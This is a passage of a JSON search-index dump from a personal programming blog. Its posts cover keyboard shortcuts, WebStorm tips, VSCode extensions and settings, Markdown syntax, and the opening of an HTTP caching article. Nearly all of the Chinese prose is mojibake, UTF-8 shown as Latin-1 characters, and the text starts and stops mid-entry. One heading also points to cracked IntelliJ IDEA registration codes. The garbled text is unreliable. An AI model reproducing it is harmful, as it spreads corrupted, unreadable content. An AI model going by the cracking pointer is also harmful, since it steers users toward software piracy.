Linux-Deepin: Ctrl + Alt + T # Terminal ç»ˆç«¯ Ctrl + Alt + ESC # ç³»ç»Ÿç›‘è§†å™¨ Shift + ç©ºæ ¼ # å…¨å±€åº”ç”¨æœç´¢ Ctrl + Shift + S # æˆªå›¾ - å¯è°ƒæ•´ï¼Œé€šå¸¸æ˜¯Ctrl + Shift + S Ctrl + H # åˆ‡æ¢éšè—æ–‡ä»¶ Win + L # é”å± å¤šä»»åŠ¡è§†å›¾/å·¥ä½œåŒº: æ›´å¤š\u0026quot;å·¥ä½œåŒºå’Œå¤šä»»åŠ¡è§†å›¾\u0026quot;å†…å®¹ï¼Œè¯·å‚è€ƒå·¥ä½œåŒºå’Œçª—å£ç®¡ç†å™¨ | Deepinç¤¾åŒº\nWin + A # æ˜¾ç¤ºæ‰€æœ‰å·¥ä½œåŒºçš„ä»»åŠ¡è§†å›¾ Win + S # æ˜¾ç¤ºå½“å‰å·¥ä½œåŒºçš„ä»»åŠ¡è§†å›¾ Win + å·¦å³æ–¹å‘é”® # åˆ‡æ›å·¥ä½œåŒº 2.æ–‡ä»¶å¤„ç† i. MacOS: Command + c/v/z/x # æ–‡ä»¶æ“ä½œ Command + N # æ–‡ä»¶æ–°å»º ii. Linux-Deepin: # ç»ˆç«¯ï¼šå¢åŠ  Shift Ctrl + Shift + S # ä¿å­˜ Ctrl + Alt + C / V / Z # å¤åˆ¶/ç²˜è´´/æ’¤å› # éç»ˆç«¯ Ctrl + S # ä¿å­˜ Ctrl + C / V / Z # å¤åˆ¶/ç²˜è´´/æ’¤å› 3.æ¡Œé¢(æ—¥å¸¸)è½¯ä»¶ i. MacOS: # å¾®ä¿¡ Shift + Command + W # æ˜¾ç¤º/éšè—ä¸»é¢æ¿ Shift + Command + A # æˆªå›¾ ii. Linux-Deepin: # å¾®ä¿¡ Ctrl + Alt + W # å¾®ä¿¡: æ˜¾ç¤º/éšè— # è¾“å…¥æ³• Ctrl + Shift # åˆ‡æ¢è¾“å…¥æ³• Shit # è¾“å…¥æ³•åˆ‡æ¢ä¸­/è‹±æ–‡ 4.æ¡Œé¢(å¼€å‘)è½¯ä»¶ i. MacOS: # Chrome Shift + Command + F # å…¨å±æ¨¡å¼ä¸‹ï¼šéšè—/å±•ç¤ºå¤´éƒ¨å¯¼èˆªæ èœå• # VSCode # æ›´å¤šå¿«æ·é”® https://segmentfault.com/a/1190000012047237 Shift + Command + N # æ‰“å¼€ä¸€ä¸ªæ–°çª—å£ Shift + Option + F # æ ¼å¼åŒ– code Command + é¼ æ ‡å·¦é”® # è¿›å…¥ï¼šå½“å‰å‡½æ•°ï¼Œåœ¨å¼€å‘è¯­è¨€å†…å¯¹åº”çš„ä½¿ç”¨ä»‹ç» Command + / # å•è¡Œæ³¨é‡Š Shift + Option + A # å¤šè¡Œæ³¨é‡Š ii. Linux-Deepin: # Chrome Ctrl + Shift + C # Chrome å¼€å‘è€…æ¨¡å¼ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/computer-basics/shortcut-keys/","summary":"\u003cp\u003e\u003ccode\u003eMacOS / Linux / Windows\u003c/code\u003eè®¾å¤‡ç­‰å¿«æ·æ“ä½œ\u0026hellip;\u003c/p\u003e","title":"ç³»ç»Ÿå·¥å…·: å¿«æ·é”®ï¼ˆShortcut keysï¼‰"},{"content":"webstormä½¿ç”¨ä¸­çš„é—®é¢˜å’Œå¿«æ·é”®\u0026hellip;\nä¸€ã€ä½¿ç”¨ä¸­çš„é—®é¢˜ 1.ç ´è§£ IntelliJ IDEA æ³¨å†Œç \n2.è§£å†³å¡é¡¿é—®é¢˜ http://blog.csdn.net/nideshijian/article/details/53174028\n2.1 excluded å¤§æ–‡ä»¶ æ‰«ææ’é™¤å¤§æ–‡ä»¶\nå¯¹åº”æ–‡ä»¶å³é”® -\u0026gt; mark directory as -\u0026gt; excludedï¼ˆæ’é™¤)\n2.2 ä¿®æ”¹webstormå†…å­˜ # è·¯å¾„JetBrains/WebStorm/bin/WebStorm.exe.vmoptions # ç¼–è¾‘å™¨ æ‰“å¼€ ä¿®æ”¹ -Xms526m -Xmx1024mï¼ˆpsï¼š-Xmsæœ€å¤§å€¼ä¸èƒ½è¶…è¿‡1024ï¼Œå¦åˆ™webstormå°†æ— æ³•æ‰“å¼€ï¼‰ # é‡å¯webstorm æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/editortools-webstorm/","summary":"\u003cp\u003ewebstormä½¿ç”¨ä¸­çš„é—®é¢˜å’Œå¿«æ·é”®\u0026hellip;\u003c/p\u003e","title":"webstorm"},{"content":"vsCodeç¼–è¾‘å™¨ç›¸å…³çš„æ‹“å±•æ’ä»¶extension\u0026hellip;\nä¸€ã€ç¼–ç ç›¸å…³ å‚è€ƒæ–‡ç« 1 å‚è€ƒæ–‡ç« 2\n1.ç¼–ç èƒ½åŠ› Auto Close Tagï¼šè‡ªåŠ¨é—­åˆHTML/XMLæ ‡ç­¾ Auto Rename Tagï¼šè‡ªåŠ¨å®Œæˆå¦ä¸€ä¾§æ ‡ç­¾çš„åŒæ­¥ä¿®æ”¹ Beautifyï¼šæ ¼å¼åŒ–ä»£ç ï¼Œæ”¯æŒè‡ªå®šä¹‰æ ¼å¼åŒ–ä»£ç è§„åˆ™, é»˜è®¤æ ¼å¼åŒ–ä»£ç æŒ‰é”®ä¸ºcmd+b ESLint: jsè¯­æ³•çº é”™ï¼Œå¯ä»¥è‡ªå®šä¹‰é…ç½®ï¼Œé…ç½®è¾ƒä¸ºå¤æ‚ï¼Œå»ºè®®ä½¿ç”¨ç½‘ä¸Šä¸€äº›å¹¿æ³›ä½¿ç”¨çš„eslinté…ç½® HTML Snippets: æ™ºèƒ½æç¤ºHTMLæ ‡ç­¾ï¼Œä»¥åŠæ ‡ç­¾å«ä¹‰ HTML CSS Support: æ™ºèƒ½æç¤ºCSSç±»åä»¥åŠid Vetur: Vueå¤šåŠŸèƒ½é›†æˆæ’ä»¶ï¼ŒåŒ…æ‹¬ï¼šè¯­æ³•é«˜äº®ï¼Œæ™ºèƒ½æç¤ºï¼Œemmetï¼Œé”™è¯¯æç¤ºï¼Œæ ¼å¼åŒ–ï¼Œè‡ªåŠ¨è¡¥å…¨ï¼Œdebuggerã€‚vscodeå®˜æ–¹é’¦å®šVueæ’ä»¶ ESLint Rules eslint-config-google TypeScript Vue Plugin (Volar) 2.3Dç›¸å…³ glTF Tools v2.3.16: Tools for glTF and GLB 3D models äºŒã€æ‹“å±•å·¥å…· 1.Gitç›¸å…³ git log\nGit History: VS Code è‡ªå¸¦çš„æ‰©å±•ç¨‹åºï¼Œç”¨äºæŸ¥çœ‹å’Œæµè§ˆåŸºç¡€çš„ Git æäº¤å†å²è®°å½• GitLens: åŠŸèƒ½å¼ºå¤§ï¼Œæä¾›ä¸°å¯Œå›¾å½¢è¡¨ç¤º Git å†å²è®°å½•å’Œå†å²ä¿®æ”¹äººï¼ŒåŒ…æ‹¬æ—¶é—´çº¿è§†å›¾ã€åˆ†æ”¯å›¾å’Œæäº¤è¯¦ç»†ä¿¡æ¯ 2.LeetCode å¸¸è§çš„ä¸¤ä¸ªé…ç½®é—®é¢˜ï¼š\nç™»é™†é—®é¢˜ï¼šå›½å¤–ç‰ˆå·²ç»åˆ‡æ¢ï¼Œç›®å‰å›½å†…ç‰ˆè¿˜å¤„äºæ­£å¸¸çŠ¶æ€ã€‚è‹¥å‡ºç°é—®é¢˜ï¼Œé€‰æ‹©ç¬¬ä¸‰æ–¹ç™»å½•æˆ–cookieç™»å½•ã€‚ leetcodeé…ç½® é…ç½®ä»£ç å­˜æ”¾çš„æ–‡ä»¶è·¯å¾„: é…ç½®åä¸ºleetcode.workspaceFolderï¼Œé»˜è®¤çš„è·¯å¾„æ˜¯$HOME/.leetcodeã€‚å¯é€šè¿‡ç»ˆç«¯echo $HOMEæŸ¥çœ‹$HOMEè·¯å¾„ ç¼–è¾‘å™¨çš„å¿«æ·æ–¹å¼ï¼šleetcodeè°ƒè¯•é¡µä¸€èˆ¬ä¼šæœ‰ä¸¤ä¸ªæŒ‰é’®Submitå’ŒTestã€‚å¦å¤–ï¼Œå¯é€šè¿‡leetcode.editor.shortcutsé…ç½®ï¼Œå¢åŠ SolutionæŸ¥çœ‹å½“å‰æœ€é«˜èµçš„ä»£ç å’ŒDescriptionæ˜¾ç¤ºé—®é¢˜æè¿° å‚è€ƒ: å¸¸è§é…ç½®å’Œä½¿ç”¨\n3.Markdown All in One å†…å®¹è¾ƒé•¿çš„markdownæ–‡ä»¶ä¸ä¾¿é˜…è¯»ï¼ŒGitHubåˆä¸èƒ½é€šè¿‡ tocæ ‡ç­¾è‡ªåŠ¨ç”Ÿæˆï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½é€šè¿‡è¯¥æ’ä»¶åœ¨vscodeç”Ÿæˆæ·»åŠ tocç›®å½•åå†ä¸Šä¼ ã€‚ æ³¨æ„ï¼šè‹¥ä¿®æ”¹æ ‡é¢˜ç»“æ„ï¼Œåˆ™éœ€åˆ é™¤ç”Ÿæˆçš„æ—§ç›®å½•ï¼Œã€é‡æ–°ç”Ÿæˆã€‘ã€‚\nåœ¨VSCodeä¸­å®‰è£…Markdown All in Oneæ’ä»¶ æŒ‰ä¸‹Command+Shift+Pï¼Œè¾“å…¥tocï¼Œé€‰æ‹©åˆ›å»ºç›®å½•ï¼ˆMarkdown All in One: Create Table of Contentsï¼‰ï¼Œä¼šè‡ªåŠ¨ä¸ºmarkdownæ–‡ä»¶ç”Ÿæˆç›®å½•ã€‚ å‚è€ƒï¼šåœ¨VSCodeä¸­ä¸ºmarkdownæ–‡ä»¶è‡ªåŠ¨ç”Ÿæˆç›®å½•\n4.Markdown Preview Mermaid Support ä½¿ç”¨æ–‡æ¡£ç›¸å…³ï¼Œå¯æœç´ MermaidæŸ¥çœ‹ã€‚mermaid: cloud_notes\n5.koroFileHeader ç”¨äºç”Ÿæˆæ–‡ä»¶å¤´éƒ¨æ³¨é‡Šå’Œå‡½æ•°æ³¨é‡Šçš„VSCodeæ’ä»¶ï¼ŒåŒ…æ‹¬ä½œè€…ã€æ—¥æœŸã€æ–‡ä»¶è·¯å¾„ç­‰ä¿¡æ¯ï¼Œæ”¯æŒæ‰€æœ‰ä¸»æµè¯­è¨€ã€‚\nä»¥ä¸‹æ˜¯ä½¿ç”¨ koroFileHeader æ’ä»¶çš„åŸºæœ¬æ­¥éª¤ï¼š\n1.å®‰è£…å®Œæˆåï¼Œä¾æ¬¡ç‚¹å‡»VSCodeçš„å·¦ä¸‹è§’è®¾ç½®å›¾æ ‡ -\u0026gt; \u0026quot;æ‰©å±•\u0026quot; -\u0026gt; koroFileHeaderæ’ä»¶ -\u0026gt; é…ç½®Icon -\u0026gt; æ‰©å±•é…ç½® -\u0026gt; Fileheader: Custom Mode(åœ¨setting.jsoné‡Œé…ç½®)ã€‚é…ç½®çš„å…·ä½“é€‰é¡¹å¯ä»¥åœ¨æ’ä»¶çš„æ–‡æ¡£ä¸­æ‰¾åˆ°ã€‚\n\u0026#34;fileheader.customMade\u0026#34;: { \u0026#34;Author\u0026#34;: \u0026#34;lianpf\u0026#34;, \u0026#34;Date\u0026#34;: \u0026#34;${currentYear}-${currentMonth}-${currentDate}\u0026#34;, \u0026#34;LastEditors\u0026#34;: \u0026#34;${username}\u0026#34;, // ä½ çš„ç³»ç»Ÿåç§° \u0026#34;LastEditTime\u0026#34;: \u0026#34;${currentYear}-${currentMonth}-${currentDate} ${currentHour}:${currentMinute}:${currentSecond}\u0026#34;, \u0026#34;Description\u0026#34;: \u0026#34;Your Description\u0026#34;, \u0026#34;FilePath\u0026#34;: \u0026#34;${relativeFileDir}\u0026#34; // æ’å…¥å½“å‰æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ } 2.é…ç½®åï¼Œä¼šåœ¨ä½ çš„æ–‡ä»¶é¡¶éƒ¨ï¼Œæ’å…¥ä¸€è¡Œç±»ä¼¼ä»¥ä¸‹çš„æ³¨é‡Šå—ï¼š\n\u0026lt;!-- * @Author: your name * @Date: 2023-08-29 09:32:43 * @LastEditors: your name * @LastEditTime: 2023-08-29 15:05:06 * @FilePath: your file path * @Description: your description --\u0026gt; å½“ä½ æ–°å¢/ä¿®æ”¹æ–‡ä»¶å†…å®¹æ—¶ï¼Œä¿å­˜æ–‡ä»¶åæ’ä»¶ä¼šæ ¹æ®ä½ çš„è®¾ç½®è‡ªåŠ¨æ›´æ–°æ³¨é‡Šå—ä¸­çš„ LastEditors å’Œ LastEditTime ç­‰ä¿¡æ¯ã€‚\n3.æ‰‹åŠ¨è§¦å‘ï¼š å¦‚æœæ’ä»¶é…ç½®æ­£ç¡®ä½†ä»æœªè‡ªåŠ¨ç”Ÿæ•ˆï¼Œä½ å¯ä»¥åœ¨ç¼–è¾‘å™¨ä¸­ï¼Œå°è¯•ä½¿ç”¨å¿«æ·é”®Ctrl + Command + Iæ‰‹åŠ¨è§¦å‘æ–‡ä»¶å¤´çš„ç”Ÿæˆã€‚\n4.å¦‚æœæƒ³è®© koroFileHeader æ’ä»¶å¿½ç•¥æŸäº›æ–‡ä»¶ï¼Œå†³å®šå“ªäº›æ–‡ä»¶ä¸éœ€è¦ç”Ÿæˆæ–‡ä»¶å¤´ã€‚å¯åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª .koroignore æ–‡ä»¶ï¼Œåˆ—å‡ºæƒ³è¦å¿½ç•¥çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„è§„åˆ™ã€‚\nä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹ .koroignore æ–‡ä»¶çš„å†…å®¹ï¼š\n# å¿½ç•¥æ‰€æœ‰ .txt æ–‡ä»¶ *.txt # å¿½ç•¥ assets æ–‡ä»¶å¤¹ /assets/ # å¿½ç•¥ç‰¹å®šæ–‡ä»¶ ignore_this_file.js æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/editortools-vscode/","summary":"\u003cp\u003e\u003ccode\u003evsCode\u003c/code\u003eç¼–è¾‘å™¨ç›¸å…³çš„æ‹“å±•æ’ä»¶\u003ccode\u003eextension\u003c/code\u003e\u0026hellip;\u003c/p\u003e","title":"ç¼–ç¨‹å·¥å…·: VSCode"},{"content":"markdownè¯­æ³•\u0026hellip;\nä¸€ã€æ ‡å‡†åŸºç¡€è¯­æ³• 1. æ–‡æœ¬ \u0026amp; æ ‡é¢˜ (1) æ ‡é¢˜ // å‡ ä¸ª#å·è¡¨ç¤ºå‡ çº§æ ‡é¢˜ # ä¸€çº§æ ‡é¢˜ ... #### å››çº§æ ‡é¢˜ (2) å¼•ç”¨ \u0026gt; å¼•ç”¨ text // ä¸€ä¸ª\u0026gt;å·å˜å¼•ç”¨ã€‚å³å¯å‘ˆç°å‡ºç°è‰²åº•è‰²å¼•ç”¨çš„æ•ˆæœ (3) åŠ ç²—ã€æ–œä½“å’Œåˆ é™¤ *text* // ä¸€å¯¹*æ˜¯æ–œä½“ **text2** // ä¸¤å¯¹*æ˜¯åŠ ç²— ***text3*** // å¤šå¯¹*å·æ–œç²—ä½“ ~~11~~ // ä¸¤å¯¹~~æ˜¯åˆ é™¤ ç¤ºä¾‹:\næ–œä½“ åŠ ç²— æ–œä½“åŠ ç²— åˆ é™¤\nå¼•ç”¨ text\n2. å›¾ç‰‡ \u0026amp; é“¾æ¥ (1) å›¾ç‰‡ // Alt å’Œ Title éƒ½ä¸æ˜¯å¿…é¡»çš„ï¼Œå¯ä»¥çœç•¥ï¼Œä½†å»ºè®®å†™ä¸Š // Altçš„æ„æ€æ˜¯å¦‚æœå›¾ç‰‡å› ä¸ºæŸäº›åŸå› ä¸èƒ½æ˜¾ç¤ºï¼Œå°±ç”¨å®šä¹‰çš„å›¾ç‰‡Altæ–‡å­—æ¥ä»£æ›¿å›¾ç‰‡ // Titleè¡¨ç¤ºé¼ æ ‡æ‚¬åœä¸å›¾ç‰‡ä¸Šæ—¶å‡ºç°çš„æ–‡å­— ![Alt](src â€œTitleâ€) // å¯çœç•¥ä¸º ![](src) (2) è¶…é“¾æ¥ [Tag](href) // æ‹¬å·é‡Œæ˜¯å¯¹åº”çš„é“¾æ¥ã€‚ä¾‹ï¼š[ç™¾åº¦](https://www.baidu.com) 3. åˆ†éš”çº¿ \u0026amp; åˆ—è¡¨ \u0026amp; è¡¨æ ¼ (1) åˆ†éš”çº¿ *** // ä¸‰ä¸ªä»¥ä¸Šçš„æ˜Ÿå·ã€å‡å·ã€åº•çº¿å»ºç«‹ä¸€ä¸ªåˆ†å‰²çº¿ (2) åˆ—è¡¨ // æœ‰åºåˆ—è¡¨ 1. Bird 2. McHale // æ— åºåˆ—è¡¨ã€‚ä½¿ç”¨`*`,`+`,`-`ä¸­ä»»æ„ä¸€ç§æ¥è¡¨ç¤º - red + Green * Blue (3) è¡¨æ ¼ // |è¡¨ç¤ºåˆ†å‰²çº¿ï¼Œ:è¡¨ç¤ºæ–‡æ¡ˆå¯¹é½æ–¹å¼ | é¡¹ç›® | ä»·æ ¼ | æ•°é‡ | :--- | ---:| :---: | Computer | 1600 å…ƒ | 5 | Phone | 12 å…ƒ | 12 ç¤ºä¾‹:\né¡¹ç›® ä»·æ ¼ æ•°é‡ Computer 1600 å…ƒ 5 Phone 12 å…ƒ 12 4. ä»£ç å— åœ¨3å¯¹`å·å†…æ’ä»£ç ï¼Œè¡¨ç¤ºæ’å…¥ä¸€æ®µé«˜äº®ä»£ç ã€‚ åœ¨1å¯¹`å·å†…æ’å…¥ä»£ç ï¼Œè¡¨ç¤ºæ’å…¥ä¸€è¡Œé«˜äº®ä»£ç  @requires_authorization def somefunc(param1=\u0026#39;\u0026#39;, param2=0): \u0026#39;\u0026#39;\u0026#39;A docstring\u0026#39;\u0026#39;\u0026#39; if param1 \u0026gt; param2: # interesting print \u0026#39;Greater\u0026#39; return (param2 - param1 + 1) or None äºŒã€æ–‡æ¡ˆç‰¹æ®Šæ ‡è¯†å’Œé¢œè‰² 1. ç‰¹æ®Šæ ‡è¯†ï¼šemoji æ ‡è¯†æœç´¢åœ°å€ï¼šemoji\nå¸¸ç”¨æ ‡è¯†: ğŸ“ã€ğŸ“Œã€ğŸ“ã€ğŸ”¨ã€ğŸ› ï¸ã€ğŸ‡¨ğŸ‡³\n2. é€šç”¨é¢œè‰²è®¾ç½® (1) diff æ¯”å¯¹ // 1.```diffï¼šä»£ç å—åŠ diffæ ‡è¯†ã€‚2.+æˆ–-ç¬¦å· + ## test - 123 ç¤ºä¾‹:\n+ ## test - 123 3. å¸¸ç”¨å·¥å…·: VSCode \u0026amp; Typoraä¸ºä»£è¡¨ éGiteeå’ŒGitHub:\n(1) fontæ ‡ç­¾ \u0026lt;font color=\u0026#34;#d14\u0026#34;\u0026gt;æ–‡æ¡ˆåŠ å¼º\u0026lt;/font\u0026gt; // çº¢è‰² (2) æœ‰é“äº‘åŠ è‰² ==text== (3) imgæ ‡è¯†é¢œè‰² ![#f03c15](https://via.placeholder.com/15/f03c15/000000?text=+) `#f03c15` ![#c5f015](https://via.placeholder.com/15/c5f015/000000?text=+) `#c5f015` ![#1589F0](https://via.placeholder.com/15/1589F0/000000?text=+) `#1589F0` ç¤ºä¾‹(3): #f03c15ã€ #c5f015ã€ #1589F0\n4. Htmlæ ·å¼: Gitee\u0026amp;GitHub ä¸ºäº†ä¿è¯å’ŒGitHubæ¸²æŸ“çš„ä¸€è‡´ï¼ŒGiteeå°†Markdownè§£æå™¨æ›´æ¢ä¸º CommonMark\n\u0026lt;!--```html ä»£ç å—æ ‡è¯†ä¸ºhtml --\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt; font-blue { color: #3693ff; } font-green { color: #19be6b; } font-yellow { color: #f90; } font-red { color: #ed4014; } \u0026lt;/style\u0026gt; \u0026lt;font-blue\u0026gt;font blue\u0026lt;/font-blue\u0026gt; \u0026lt;font-green\u0026gt;font green\u0026lt;/font-green\u0026gt; \u0026lt;font-yellow\u0026gt;font yellow\u0026lt;/font-yellow\u0026gt; \u0026lt;font-red\u0026gt;font red\u0026lt;/font-red\u0026gt; ç¤ºä¾‹:\næ–‡æœ¬blueï¼šfont blue tag blueï¼štag blue ä¸‰ã€å…¶ä»–ç¼–è¾‘å™¨å¯èƒ½æ”¯æŒè¯­æ³• åœ¨çº¿ç¼–è¾‘å™¨ https://www.zybuluo.com/mdeditor\n1. æµç¨‹å›¾/åºåˆ—å›¾/ç”˜ç‰¹å›¾ (1) æµç¨‹å›¾ // ```flow ä»£ç å—æ ‡è¯†ä¸ºflow st=\u0026gt;start: å¼€å§‹ e=\u0026gt;end: ç»“æŸ op=\u0026gt;operation: æˆ‘çš„æ“ä½œ cond=\u0026gt;condition: ç¡®è®¤ï¼Ÿ st-\u0026gt;op-\u0026gt;cond cond(yes)-\u0026gt;e cond(no)-\u0026gt;op (2) åºåˆ—å›¾ // ```sequence ä»£ç å—æ ‡è¯†ä¸ºsequence å¼ ä¸‰-\u0026gt;æå››: å˜¿ï¼Œå°å››å„¿, å†™åšå®¢äº†æ²¡? Note right of æå››: æå››æ„£äº†ä¸€ä¸‹ï¼Œè¯´ï¼š æå››--\u0026gt;å¼ ä¸‰: å¿™å¾—åè¡€ï¼Œå“ªæœ‰æ—¶é—´å†™ã€‚ (3) ç”˜ç‰¹å›¾ // ```gantt ä»£ç å—æ ‡è¯†ä¸ºgantt dateFormat YYYY-MM-DD title äº§å“è®¡åˆ’è¡¨ section v1.0 æ˜ç¡®éœ€æ±‚: done, des1, 2018-01-06,3d è·Ÿè¿›å¼€å‘: 2018-01-09, 4d èµ°æŸ¥æµ‹è¯•: 2018-01-13, 3d section v2.0 æ˜ç¡®éœ€æ±‚: 2018-01-12,72h è·Ÿè¿›å¼€å‘: 2018-01-16, 6d èµ°æŸ¥æµ‹è¯•: 2018-01-22, 3d section v3.0 å¤æµ‹: 2018-01-16, 10d 2. è„šæ³¨ ç”¨æ³•ç¤ºä¾‹\nè¿™æ˜¯ä¸€ä¸ªè„šæ³¨çš„ä¾‹å­[^1] [^1]: è¿™é‡Œæ˜¯è„šæ³¨ 3. ç›®å½• [TOC] # h0 ## h1 ## h2 ##### h6 4. æ•°å­¦å…¬å¼ // è¡Œå†…å…¬å¼ $\\Gamma(n) = (n-1)!\\quad\\forall n\\in\\mathbb N$ // å—çº§å…¬å¼ $$ \\sum_{i=0}^n i^2 = \\frac{(n^2+n)(2n+1)}{6} $$ å››ã€åœ¨VSCodeä¸­çš„é…ç½® 1.è‡ªåŠ¨ç”Ÿæˆç›®å½•toc markdown-all-in-one\næœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/14.markdown/","summary":"\u003cp\u003emarkdownè¯­æ³•\u0026hellip;\u003c/p\u003e","title":"Markdown: è¯­æ³•\u0026ç¼–è¾‘å·¥å…·"},{"content":" å¤§å®¶ä¸åº”è¯¥ä»…ä»…å±€é™äºçŸ¥é“æµè§ˆå™¨ä¼šå¯¹è¯·æ±‚çš„é™æ€æ–‡ä»¶è¿›è¡Œç¼“å­˜, ä½†æ˜¯ä¸ºä»€ä¹ˆè¢«ç¼“å­˜, ç¼“å­˜æ˜¯ æ€ä¹ˆç”Ÿæ•ˆçš„, ä¹Ÿè¦æ¸…æ¸…æ¥šæ¥š\nä¸€ã€ ç†è§£ http ç¼“å­˜æœºåˆ¶çš„å¿…è¦æ€§ http ç¼“å­˜æœºåˆ¶ä½œä¸ºWebæ€§èƒ½ä¼˜åŒ–çš„é‡è¦æ‰‹æ®µ, æ˜¯è®¡ç®—æœºçŸ¥è¯†ä½“ç³»ä¸­çš„ä¸€ä¸ªåŸºç¡€çš„ç¯èŠ‚, åŒæ—¶ä¹Ÿæ˜¯å‰ç«¯æ¶æ„å¸ˆåŒå­¦çš„å¿…å¤‡æŠ€èƒ½\näºŒã€ç¼“å­˜è§„åˆ™è§£æ ä¸ºæ–¹ä¾¿å¤§å®¶ç†è§£ï¼Œæˆ‘ä»¬å¯ä»¥è®¤ä¸ºæµè§ˆå™¨å­˜åœ¨ä¸€ä¸ªç¼“å­˜æ•°æ®åº“,ç”¨äºå­˜å‚¨ç¼“å­˜ä¿¡æ¯. åœ¨å®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡è¯·æ±‚æ•°æ®æ—¶ï¼Œæ­¤æ—¶ç¼“å­˜æ•°æ®åº“ä¸­æ²¡æœ‰å¯¹åº”çš„ç¼“å­˜æ•°æ®ï¼Œéœ€è¦è¯·æ±‚æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è¿”å›åï¼Œå°†æ•°æ®å­˜å‚¨è‡³ç¼“å­˜æ•°æ®åº“ä¸­\næ ¹æ®æ˜¯å¦éœ€è¦é‡æ–°å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚æ¥åˆ†ç±»(å¼ºåˆ¶ç¼“å­˜, å¯¹æ¯”ç¼“å­˜)ã€‚ é¦–å…ˆé€šè¿‡æ—¶åºå›¾çš„æ–¹å¼, å¯¹ä»–ä»¬æœ‰ä¸ªç®€å•çš„äº†è§£:\nå·²å­˜åœ¨ç¼“å­˜æ•°æ® ä»…åŸºäºå¼ºåˆ¶ç¼“å­˜ï¼Œè¯·æ±‚æ•°æ®çš„æµç¨‹å¦‚ä¸‹: ä»…åŸºäºå¯¹æ¯”ç¼“å­˜ï¼Œè¯·æ±‚æ•°æ®çš„æµç¨‹å¦‚ä¸‹: å¯ä»¥çœ‹åˆ°ï¼Œå¼ºåˆ¶ç¼“å­˜å¦‚æœç”Ÿæ•ˆï¼Œä¸éœ€è¦å†å’ŒæœåŠ¡å™¨å‘ç”Ÿäº¤äº’ï¼Œè€Œå¯¹æ¯”ç¼“å­˜ä¸ç®¡æ˜¯å¦ç”Ÿæ•ˆï¼Œéƒ½éœ€è¦ä¸æœåŠ¡ç«¯å‘ç”Ÿäº¤äº’\nå½“æ‰§è¡Œå¼ºåˆ¶ç¼“å­˜çš„è§„åˆ™æ—¶ï¼Œå¦‚æœç¼“å­˜ç”Ÿæ•ˆï¼Œç›´æ¥ä½¿ç”¨ç¼“å­˜ï¼Œä¸å†æ‰§è¡Œå¯¹æ¯”ç¼“å­˜è§„åˆ™\n1.å¼ºåˆ¶ç¼“å­˜ 